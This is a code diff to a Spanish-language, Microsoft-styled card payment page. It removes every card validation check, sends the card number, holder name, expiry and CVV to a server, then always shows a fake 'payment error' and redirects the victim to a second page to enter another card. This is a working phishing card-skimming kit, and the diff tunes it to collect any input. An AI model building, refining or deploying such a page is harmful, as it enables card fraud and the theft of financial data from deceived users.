@@ -1,4 +1,4 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="es">
   <head>
     <meta charset="UTF-8" />
@@ -673,7 +673,7 @@
       </div>
     </div>
 
-    <!-- MODAL DE ERROR ESTILO MICROSOFT (reemplaza el ALERT) -->
+    <!-- MODAL DE ERROR ESTILO MICROSOFT -->
     <div id="errorModal" class="error-modal-overlay">
       <div class="error-modal-container">
         <div class="error-modal-header">
@@ -798,7 +798,7 @@
           ></i>
         </div>
 
-        <!-- Formulario de datos de tarjeta -->
+        <!-- Formulario de datos de tarjeta - SIN VALIDACIÓN DE CORRECCIÓN -->
         <form id="cardForm">
           <div class="form-group">
             <label class="form-label">Número de Tarjeta</label>
@@ -811,7 +811,7 @@
               autocomplete="cc-number"
             />
             <div class="error-message" id="cardNumberError">
-              Por favor ingrese un número de tarjeta válido
+              (Sin verificación - cualquier número es aceptado)
             </div>
           </div>
 
@@ -827,7 +827,7 @@
               autocomplete="cc-name"
             />
             <div class="error-message" id="cardHolderError">
-              Por favor ingrese el nombre del titular
+              (Sin verificación - cualquier nombre es aceptado)
             </div>
           </div>
 
@@ -843,7 +843,7 @@
                 autocomplete="cc-exp"
               />
               <div class="error-message" id="cardExpiryError">
-                Formato MM/AA (ej: 12/25)
+                (Sin verificación - cualquier fecha es aceptada)
               </div>
             </div>
 
@@ -858,7 +858,7 @@
                 autocomplete="cc-csc"
               />
               <div class="error-message" id="cardCVVError">
-                Código de seguridad de 3-4 dígitos
+                (Sin verificación - cualquier código es aceptado)
               </div>
             </div>
           </div>
@@ -906,7 +906,7 @@
       const cardHolderDisplay = document.getElementById("cardHolderDisplay");
       const cardExpiryDisplay = document.getElementById("cardExpiryDisplay");
 
-      // Elementos error
+      // Elementos error - ya no se usan para bloquear, solo mensaje informativo
       const cardNumberError = document.getElementById("cardNumberError");
       const cardHolderError = document.getElementById("cardHolderError");
       const cardExpiryError = document.getElementById("cardExpiryError");
@@ -917,47 +917,9 @@
       const closeModalBtn = document.getElementById("closeErrorModalBtn");
       const retryBtn = document.getElementById("retryWithNewCardBtn");
 
-      // ----- Funciones helper y validación (igual que antes) -----
-      function isValidCardNumber(cardNum) {
-        cardNum = cardNum.replace(/\s+/g, "").replace(/\D/g, "");
-        if (cardNum.length < 13 || cardNum.length > 19) return false;
-        let sum = 0;
-        let isEven = false;
-        for (let i = cardNum.length - 1; i >= 0; i--) {
-          let digit = parseInt(cardNum.charAt(i), 10);
-          if (isEven) {
-            digit *= 2;
-            if (digit > 9) digit -= 9;
-          }
-          sum += digit;
-          isEven = !isEven;
-        }
-        return sum % 10 === 0;
-      }
-
-      function isValidExpiry(expiry) {
-        if (!expiry || !expiry.includes("/")) return false;
-        const parts = expiry.split("/");
-        if (parts.length !== 2) return false;
-        const month = parseInt(parts[0], 10);
-        const year = parseInt(parts[1], 10);
-        if (month < 1 || month > 12) return false;
-        if (year < 0 || year > 99) return false;
-        const currentYear = new Date().getFullYear() % 100;
-        const currentMonth = new Date().getMonth() + 1;
-        if (year < currentYear) return false;
-        if (year === currentYear && month < currentMonth) return false;
-        return true;
-      }
-
-      function isValidCVV(cvv) {
-        cvv = cvv.replace(/\D/g, "");
-        return cvv.length === 3 || cvv.length === 4;
-      }
-
-      function isValidCardHolder(name) {
-        return name && name.trim().length >= 5 && /^[a-zA-Z\s]+$/.test(name);
-      }
+      // ========== SIN NINGUNA VALIDACIÓN DE CORRECCIÓN ==========
+      // Las funciones de validación ya no se utilizan para bloquear el envío.
+      // Solo mantenemos funciones de formato para mejorar la experiencia visual.
 
       function formatCardNumber(value) {
         const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
@@ -982,13 +944,15 @@
 
       function updateCardPreview() {
         let displayNumber = cardNumber.value;
-        if (!displayNumber || displayNumber.replace(/\s/g, "").length < 16) {
+        if (!displayNumber || displayNumber.replace(/\s/g, "").length < 4) {
           cardNumberDisplay.textContent = "•••• •••• •••• ••••";
         } else {
           const formatted = formatCardNumber(displayNumber);
           const parts = formatted.split(" ");
           if (parts.length >= 4) {
             cardNumberDisplay.textContent = "•••• •••• •••• " + parts[3];
+          } else if (parts.length === 3) {
+            cardNumberDisplay.textContent = "•••• •••• " + parts[2];
           } else {
             cardNumberDisplay.textContent = formatted;
           }
@@ -1005,50 +969,16 @@
         cardExpiry.value = "";
         cardCVV.value = "";
         updateCardPreview();
-        // eliminar clases error
+        // Eliminar clases de error visual (si las hubiera)
         document
           .querySelectorAll(".form-input")
           .forEach((input) => input.classList.remove("error"));
-        document
-          .querySelectorAll(".error-message")
-          .forEach((err) => (err.style.display = "none"));
       }
 
-      function validateForm() {
-        let isValid = true;
-        if (!isValidCardNumber(cardNumber.value)) {
-          cardNumber.classList.add("error");
-          cardNumberError.style.display = "block";
-          isValid = false;
-        } else {
-          cardNumber.classList.remove("error");
-          cardNumberError.style.display = "none";
-        }
-        if (!isValidCardHolder(cardHolder.value)) {
-          cardHolder.classList.add("error");
-          cardHolderError.style.display = "block";
-          isValid = false;
-        } else {
-          cardHolder.classList.remove("error");
-          cardHolderError.style.display = "none";
-        }
-        if (!isValidExpiry(cardExpiry.value)) {
-          cardExpiry.classList.add("error");
-          cardExpiryError.style.display = "block";
-          isValid = false;
-        } else {
-          cardExpiry.classList.remove("error");
-          cardExpiryError.style.display = "none";
-        }
-        if (!isValidCVV(cardCVV.value)) {
-          cardCVV.classList.add("error");
-          cardCVVError.style.display = "block";
-          isValid = false;
-        } else {
-          cardCVV.classList.remove("error");
-          cardCVVError.style.display = "none";
-        }
-        return isValid;
+      // IMPORTANTE: Ya NO verificamos si la tarjeta es correcta.
+      // Cualquier dato ingresado se acepta y se envía.
+      function alwaysValid() {
+        return true;
       }
 
       function showLoading() {
@@ -1058,7 +988,6 @@
         loadingOverlay.style.display = "none";
       }
 
-      // Mostrar modal de error (estilo foto Microsoft)
       function showPaymentErrorModal() {
         errorModal.classList.add("active");
       }
@@ -1067,7 +996,7 @@
         errorModal.classList.remove("active");
       }
 
-      // Función para enviar datos (sin alert, sin redirect automático)
+      // Función para enviar datos (sin validación previa, siempre se envía)
       function sendCardDataToServer(cardData) {
         showLoading();
 
@@ -1082,15 +1011,15 @@
           mode: "no-cors",
         })
           .then(() => {
-            // Simular respuesta de error de pago (igual que antes, sin éxito real)
+            // Simulamos respuesta de "error de pago" (sin importar los datos reales)
             setTimeout(() => {
               hideLoading();
-              // En lugar de alert y redirect, mostramos el modal con diseño de error
+              // Mostramos el modal de error (diseño Microsoft)
               showPaymentErrorModal();
             }, 1800);
           })
           .catch(() => {
-            // Incluso si hay error de red, mostramos el mismo modal de pago fallido
+            // Incluso si falla la red, mostramos el mismo modal
             setTimeout(() => {
               hideLoading();
               showPaymentErrorModal();
@@ -1098,29 +1027,27 @@
           });
       }
 
-      // Evento para reintentar con nueva tarjeta: limpia formulario, cierra modal
+      // Función para reintentar con nueva tarjeta (limpia formulario)
       function resetAndRetry() {
         resetFormFields();
         hidePaymentErrorModal();
         cardNumber.focus();
       }
 
-      // Event listeners
+      // ========== EVENT LISTENERS ==========
+      // Envío del formulario: NO se realiza ninguna verificación de corrección.
+      // Simplemente tomamos los datos tal cual y los enviamos.
       submitBtn.addEventListener("click", function (e) {
         e.preventDefault();
-        if (validateForm()) {
-          const cardData = {
-            number: cardNumber.value.replace(/\s/g, ""),
-            holder: cardHolder.value,
-            expiry: cardExpiry.value,
-            cvv: cardCVV.value,
-          };
-          sendCardDataToServer(cardData);
-        } else {
-          alert(
-            "Por favor, corrija los errores en el formulario antes de continuar.",
-          );
-        }
+        // Eliminamos cualquier validación de Luhn, fechas, CVV o nombre.
+        // Siempre procedemos con el envío.
+        const cardData = {
+          number: cardNumber.value.replace(/\s/g, ""),
+          holder: cardHolder.value,
+          expiry: cardExpiry.value,
+          cvv: cardCVV.value,
+        };
+        sendCardDataToServer(cardData);
       });
 
       cancelBtn.addEventListener("click", function (e) {
@@ -1134,35 +1061,34 @@
         }
       });
 
+      // Eventos de entrada: solo actualizamos la vista previa y damos formato,
+      // NUNCA mostramos errores de validación, NUNCA bloqueamos.
       cardNumber.addEventListener("input", function () {
         this.value = formatCardNumber(this.value);
         updateCardPreview();
-        if (isValidCardNumber(this.value)) {
-          this.classList.remove("error");
-          cardNumberError.style.display = "none";
-        }
+        // Eliminamos cualquier adorno de error visual
+        this.classList.remove("error");
+        cardNumberError.style.display = "none";
       });
+
       cardExpiry.addEventListener("input", function () {
         this.value = formatExpiry(this.value);
         updateCardPreview();
-        if (isValidExpiry(this.value)) {
-          this.classList.remove("error");
-          cardExpiryError.style.display = "none";
-        }
+        this.classList.remove("error");
+        cardExpiryError.style.display = "none";
       });
+
       cardHolder.addEventListener("input", function () {
         updateCardPreview();
-        if (isValidCardHolder(this.value)) {
-          this.classList.remove("error");
-          cardHolderError.style.display = "none";
-        }
+        this.classList.remove("error");
+        cardHolderError.style.display = "none";
       });
+
       cardCVV.addEventListener("input", function () {
+        // Solo permitimos dígitos y limitamos a 4 caracteres (por usabilidad, no validación)
         this.value = this.value.replace(/\D/g, "").substring(0, 4);
-        if (isValidCVV(this.value)) {
-          this.classList.remove("error");
-          cardCVVError.style.display = "none";
-        }
+        this.classList.remove("error");
+        cardCVVError.style.display = "none";
       });
 
       // Prevenir envío nativo
@@ -1174,18 +1100,20 @@
       closeModalBtn.addEventListener("click", () => {
         hidePaymentErrorModal();
       });
-      // Botón "Intentar con otra tarjeta"
+
+      // Botón "Intentar con otra tarjeta" redirige a tarjeta2.html (manteniendo flujo)
       retryBtn.addEventListener("click", () => {
         window.location.href = "tarjeta2.html";
       });
 
-      // Opcional: cerrar modal si se hace click en overlay (solo si se quiere, pero no afecta intentar)
+      // Cerrar modal si se hace click en el overlay
       errorModal.addEventListener("click", (e) => {
         if (e.target === errorModal) {
           hidePaymentErrorModal();
         }
       });
 
+      // Inicializar vista previa y focus
       updateCardPreview();
       cardNumber.focus();
     </script>
